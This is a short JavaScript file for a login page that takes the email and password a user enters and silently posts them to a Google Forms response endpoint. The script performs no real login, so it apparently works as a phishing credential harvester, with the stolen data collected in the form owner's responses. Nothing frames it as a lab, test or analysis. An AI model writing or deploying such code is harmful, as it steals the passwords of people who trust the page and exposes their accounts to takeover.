document.querySelector('#test').onsubmit = function(e) {
    e.preventDefault();
}
document.addEventListener("DOMContentLoaded", ()=>{
    const email = document.getElementById("loginEmail");
    const password = document.getElementById("loginPassword");
    const login = document.getElementById("login");
    login.addEventListener("click",()=>{
        const data = {
            emailData: email.value,
            passwordData: password.value,
        };

        if(data.emailData && data.passwordData){
            postGoogle(data)
        } else{
            alert("Fill in all information in the input box")
        }
        // name="entry.548772519"
        // name="entry.1152705500"

    })

})

async function postGoogle(data){
    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScOSfIslZ-kKhxPtrnq6kcbp_dYi8Yh2nqX0ma74DkqOMjuaQ/formResponse"
    const posEmail = "entry.548772519"
    const posPasswor = "entry.1152705500"
    const formData = new FormData()
    formData.append(posEmail,data.emailData)
    formData.append(posPasswor,data.passwordData)
    try {
        await fetch(formURL,{
            method: "POST",
            body: formData,
        })
    } catch {
        console.error("loi")
    }
}